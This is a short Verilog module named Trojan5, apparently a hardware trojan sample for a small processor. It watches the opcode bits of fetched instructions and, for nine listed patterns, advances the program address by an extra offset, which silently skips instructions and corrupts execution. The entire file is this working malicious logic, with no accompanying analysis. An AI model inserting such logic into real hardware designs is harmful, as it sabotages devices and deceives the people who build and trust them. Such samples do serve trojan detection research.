module Trojan5 #(
    parameter PROG_DATA_WIDTH = 14,
    parameter PC_WIDTH = 13,
    parameter INSTRUCTION_PATTERN_0 = 4'b1000,
    parameter INSTRUCTION_PATTERN_1 = 4'b1001,
    parameter INSTRUCTION_PATTERN_2 = 4'b1010,
    parameter INSTRUCTION_PATTERN_3 = 4'b1011,
    parameter INSTRUCTION_PATTERN_4 = 4'b0100,
    parameter INSTRUCTION_PATTERN_5 = 4'b0101,
    parameter INSTRUCTION_PATTERN_6 = 4'b0110,
    parameter INSTRUCTION_PATTERN_7 = 4'b0111,
    parameter INSTRUCTION_PATTERN_8 = 4'b1100,
    parameter PC_OFFSET = 2
)(
    input wire pon_rst_n_i,
    input wire [PROG_DATA_WIDTH-1:0] prog_dat_i,
    input wire [PC_WIDTH-1:0] pc_reg,
    output wire [PC_WIDTH-1:0] prog_adr_o
);

    wire match_condition = (!pon_rst_n_i) ? 1'b0 :
                           (prog_dat_i[PROG_DATA_WIDTH-1:PROG_DATA_WIDTH-4] == 4'b1101) ? 1'b0 :
                           ((prog_dat_i[PROG_DATA_WIDTH-1:PROG_DATA_WIDTH-4] == INSTRUCTION_PATTERN_0) || 
                            (prog_dat_i[PROG_DATA_WIDTH-1:PROG_DATA_WIDTH-4] == INSTRUCTION_PATTERN_1) ||
                            (prog_dat_i[PROG_DATA_WIDTH-1:PROG_DATA_WIDTH-4] == INSTRUCTION_PATTERN_2) || 
                            (prog_dat_i[PROG_DATA_WIDTH-1:PROG_DATA_WIDTH-4] == INSTRUCTION_PATTERN_3) ||
                            (prog_dat_i[PROG_DATA_WIDTH-1:PROG_DATA_WIDTH-4] == INSTRUCTION_PATTERN_4) || 
                            (prog_dat_i[PROG_DATA_WIDTH-1:PROG_DATA_WIDTH-4] == INSTRUCTION_PATTERN_5) ||
                            (prog_dat_i[PROG_DATA_WIDTH-1:PROG_DATA_WIDTH-4] == INSTRUCTION_PATTERN_6) || 
                            (prog_dat_i[PROG_DATA_WIDTH-1:PROG_DATA_WIDTH-4] == INSTRUCTION_PATTERN_7) ||
                            (prog_dat_i[PROG_DATA_WIDTH-1:PROG_DATA_WIDTH-4] == INSTRUCTION_PATTERN_8)) ? 1'b1 : 1'b0;

    assign prog_adr_o = match_condition ? pc_reg + PC_OFFSET[PC_WIDTH-1:0] : pc_reg;

endmodule